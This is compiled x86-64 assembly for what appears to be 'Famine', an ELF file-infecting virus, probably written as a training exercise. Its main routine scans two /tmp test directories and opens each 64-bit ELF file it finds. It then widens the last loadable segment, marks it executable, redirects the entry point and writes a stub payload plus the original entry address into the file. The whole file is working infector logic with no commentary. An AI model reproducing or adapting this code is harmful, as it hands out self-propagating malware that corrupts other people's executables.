	.file	"main.c"
	.intel_syntax noprefix
	.text
	.p2align 4,,15
	.globl	famine64_func
	.type	famine64_func, @function
famine64_func:
.LFB39:
	.cfi_startproc
	rep ret
	.cfi_endproc
.LFE39:
	.size	famine64_func, .-famine64_func
	.p2align 4,,15
	.globl	pack_dat_elf
	.type	pack_dat_elf, @function
pack_dat_elf:
.LFB38:
	.cfi_startproc
	cmp	BYTE PTR [rdx], 127
	je	.L24
.L22:
	rep ret
	.p2align 4,,10
	.p2align 3
.L24:
	cmp	BYTE PTR 1[rdx], 69
	jne	.L22
	cmp	BYTE PTR 2[rdx], 76
	jne	.L22
	cmp	BYTE PTR 3[rdx], 70
	jne	.L22
	cmp	BYTE PTR 4[rdx], 2
	jne	.L22
	cmp	BYTE PTR 5[rdx], 0
	je	.L22
	cmp	BYTE PTR 6[rdx], 1
	jne	.L22
	movzx	eax, BYTE PTR 16[rdx]
	sub	eax, 2
	cmp	al, 1
	ja	.L22
	push	r13
	.cfi_def_cfa_offset 16
	.cfi_offset 13, -16
	push	r12
	.cfi_def_cfa_offset 24
	.cfi_offset 12, -24
	push	rbp
	.cfi_def_cfa_offset 32
	.cfi_offset 6, -32
	push	rbx
	.cfi_def_cfa_offset 40
	.cfi_offset 3, -40
	sub	rsp, 24
	.cfi_def_cfa_offset 64
	movzx	ecx, WORD PTR 56[rdx]
	mov	r8, QWORD PTR 32[rdx]
	test	rcx, rcx
	je	.L13
	imul	rcx, rcx, 56
	lea	rax, [rdx+r8]
	add	rcx, r8
	xor	r8d, r8d
	add	rcx, rdx
	jmp	.L6
	.p2align 4,,10
	.p2align 3
.L5:
	add	rax, 56
	cmp	rcx, rax
	je	.L4
.L6:
	cmp	DWORD PTR [rax], 1
	jne	.L5
	test	r8, r8
	je	.L14
	mov	rbx, QWORD PTR 16[r8]
	cmp	QWORD PTR 16[rax], rbx
	cmova	r8, rax
	jmp	.L5
.L13:
	xor	r8d, r8d
.L4:
	movzx	ecx, WORD PTR 60[rdx]
	mov	rbx, QWORD PTR 40[rdx]
	test	rcx, rcx
	je	.L25
	mov	r11, QWORD PTR 40[r8]
	sal	rcx, 6
	add	r11, QWORD PTR 8[r8]
	mov	r10d, DWORD PTR famine64_size[rip]
	mov	r9, rcx
	lea	rax, [rdx+rbx]
	add	r9, rbx
	add	r9, rdx
.L11:
	mov	rcx, QWORD PTR 24[rax]
	cmp	rcx, r11
	jb	.L10
	add	rcx, r10
	mov	QWORD PTR 24[rax], rcx
.L10:
	add	rax, 64
	cmp	r9, rax
	jne	.L11
.L12:
	mov	rax, QWORD PTR 40[r8]
	mov	r9, QWORD PTR 24[rdx]
	add	rbx, r10
	mov	rcx, rax
	add	rcx, QWORD PTR 16[r8]
	mov	QWORD PTR 8[rsp], r9
	mov	QWORD PTR 40[rdx], rbx
	mov	QWORD PTR 24[rdx], rcx
	mov	ecx, DWORD PTR 4[r8]
	test	cl, 1
	jne	.L9
	or	ecx, 1
	mov	DWORD PTR 4[r8], ecx
.L9:
	add	rax, r10
	mov	r13, rdx
	mov	ebp, esi
	mov	QWORD PTR 40[r8], rax
	mov	QWORD PTR 32[r8], rax
	mov	rsi, r13
	add	rax, QWORD PTR 8[r8]
	mov	r12d, edi
	sub	rax, r10
	mov	rdx, rax
	mov	rbx, rax
	call	write@PLT
	mov	edx, DWORD PTR famine64_size[rip]
	lea	rsi, famine64_func[rip]
	mov	edi, r12d
	sub	rdx, 8
	call	write@PLT
	lea	rsi, 8[rsp]
	mov	edi, r12d
	mov	edx, 8
	call	write@PLT
	lea	rsi, 0[r13+rbx]
	movsx	rdx, ebp
	mov	edi, r12d
	sub	rdx, rbx
	call	write@PLT
	add	rsp, 24
	.cfi_remember_state
	.cfi_def_cfa_offset 40
	pop	rbx
	.cfi_restore 3
	.cfi_def_cfa_offset 32
	pop	rbp
	.cfi_restore 6
	.cfi_def_cfa_offset 24
	pop	r12
	.cfi_restore 12
	.cfi_def_cfa_offset 16
	pop	r13
	.cfi_restore 13
	.cfi_def_cfa_offset 8
	ret
.L14:
	.cfi_restore_state
	mov	r8, rax
	jmp	.L5
.L25:
	mov	r10d, DWORD PTR famine64_size[rip]
	jmp	.L12
	.cfi_endproc
.LFE38:
	.size	pack_dat_elf, .-pack_dat_elf
	.p2align 4,,15
	.globl	get_dat_elf
	.type	get_dat_elf, @function
get_dat_elf:
.LFB37:
	.cfi_startproc
	push	r12
	.cfi_def_cfa_offset 16
	.cfi_offset 12, -16
	push	rbp
	.cfi_def_cfa_offset 24
	.cfi_offset 6, -24
	mov	r8, rsi
	push	rbx
	.cfi_def_cfa_offset 32
	.cfi_offset 3, -32
	sub	rsp, 1024
	.cfi_def_cfa_offset 1056
	movzx	edx, BYTE PTR [rdi]
	test	dl, dl
	je	.L35
	lea	rsi, -1[rsp]
	mov	eax, 1
	.p2align 4,,10
	.p2align 3
.L28:
	mov	BYTE PTR [rsi+rax], dl
	mov	ecx, eax
	add	rax, 1
	movzx	edx, BYTE PTR -1[rdi+rax]
	test	dl, dl
	jne	.L28
.L27:
	movzx	edx, BYTE PTR [r8]
	test	dl, dl
	je	.L43
	movsx	rdi, ecx
	mov	eax, 1
	mov	rsi, rsp
	add	rdi, rsp
	.p2align 4,,10
	.p2align 3
.L30:
	mov	BYTE PTR -1[rdi+rax], dl
	mov	r9d, eax
	add	rax, 1
	movzx	edx, BYTE PTR -1[r8+rax]
	test	dl, dl
	jne	.L30
	add	ecx, r9d
.L29:
	movsx	rcx, ecx
	xor	edx, edx
	xor	eax, eax
	mov	BYTE PTR [rsp+rcx], 0
	mov	edi, 2
	xor	ecx, ecx
	call	syscall@PLT
	cmp	eax, -1
	mov	rbx, rax
	je	.L26
	mov	esi, eax
	mov	ecx, 2
	xor	eax, eax
	mov	edx, 1
	mov	edi, 8
	call	syscall@PLT
	cmp	eax, -1
	mov	rbp, rax
	je	.L42
	sub	rsp, 8
	.cfi_def_cfa_offset 1064
	mov	edx, eax
	xor	esi, esi
	push	0
	.cfi_def_cfa_offset 1072
	xor	eax, eax
	mov	r9d, ebx
	mov	r8d, 2
	mov	ecx, 3
	mov	edi, 9
	call	syscall@PLT
	mov	r12, rax
	cmp	r12, -1
	pop	rax
	.cfi_def_cfa_offset 1064
	pop	rdx
	.cfi_def_cfa_offset 1056
	je	.L42
	mov	rdx, r12
	mov	esi, ebp
	mov	edi, ebx
	call	pack_dat_elf
	mov	edi, ebx
	call	close@PLT
	mov	edx, ebp
	mov	rsi, r12
	mov	edi, 11
	xor	eax, eax
	call	syscall@PLT
.L26:
	add	rsp, 1024
	.cfi_remember_state
	.cfi_def_cfa_offset 32
	pop	rbx
	.cfi_def_cfa_offset 24
	pop	rbp
	.cfi_def_cfa_offset 16
	pop	r12
	.cfi_def_cfa_offset 8
	ret
.L42:
	.cfi_restore_state
	mov	edi, ebx
	call	close@PLT
	add	rsp, 1024
	.cfi_remember_state
	.cfi_def_cfa_offset 32
	pop	rbx
	.cfi_def_cfa_offset 24
	pop	rbp
	.cfi_def_cfa_offset 16
	pop	r12
	.cfi_def_cfa_offset 8
	ret
.L43:
	.cfi_restore_state
	mov	rsi, rsp
	jmp	.L29
.L35:
	xor	ecx, ecx
	jmp	.L27
	.cfi_endproc
.LFE37:
	.size	get_dat_elf, .-get_dat_elf
	.p2align 4,,15
	.globl	find_files
	.type	find_files, @function
find_files:
.LFB36:
	.cfi_startproc
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	xor	ecx, ecx
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	xor	edx, edx
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	mov	rsi, rdi
	xor	eax, eax
	mov	r13, rdi
	mov	edi, 2
	sub	rsp, 1048
	.cfi_def_cfa_offset 1104
	call	syscall@PLT
	mov	QWORD PTR 8[rsp], rax
	mov	r14d, DWORD PTR 8[rsp]
	lea	r12, 16[rsp]
	cmp	r14d, -1
	je	.L44
	.p2align 4,,10
	.p2align 3
.L46:
	xor	eax, eax
	mov	ecx, 1024
	mov	rdx, r12
	mov	esi, r14d
	mov	edi, 217
	call	syscall@PLT
	test	eax, eax
	mov	r15d, eax
	jle	.L53
	xor	ebx, ebx
	jmp	.L48
	.p2align 4,,10
	.p2align 3
.L47:
	movsx	eax, BYTE PTR 32[rsp+rbp]
	add	ebx, eax
	cmp	r15d, ebx
	jle	.L46
.L48:
	movsx	rbp, ebx
	cmp	BYTE PTR 34[rsp+rbp], 8
	jne	.L47
	lea	rsi, 19[r12+rbp]
	mov	rdi, r13
	call	get_dat_elf
	jmp	.L47
.L53:
	mov	edi, DWORD PTR 8[rsp]
	call	close@PLT
.L44:
	add	rsp, 1048
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE36:
	.size	find_files, .-find_files
	.section	.text.startup,"ax",@progbits
	.p2align 4,,15
	.globl	main
	.type	main, @function
main:
.LFB35:
	.cfi_startproc
	sub	rsp, 8
	.cfi_def_cfa_offset 16
	mov	rdi, QWORD PTR direct[rip]
	call	find_files
	mov	rdi, QWORD PTR direct[rip+8]
	call	find_files
	xor	eax, eax
	add	rsp, 8
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE35:
	.size	main, .-main
	.globl	famine64_size
	.data
	.align 4
	.type	famine64_size, @object
	.size	famine64_size, 4
famine64_size:
	.long	42
	.globl	direct
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"/tmp/test/"
.LC1:
	.string	"/tmp/test2/"
	.section	.data.rel.local,"aw",@progbits
	.align 16
	.type	direct, @object
	.size	direct, 24
direct:
	.quad	.LC0
	.quad	.LC1
	.quad	0
	.ident	"GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516"
	.section	.note.GNU-stack,"",@progbits
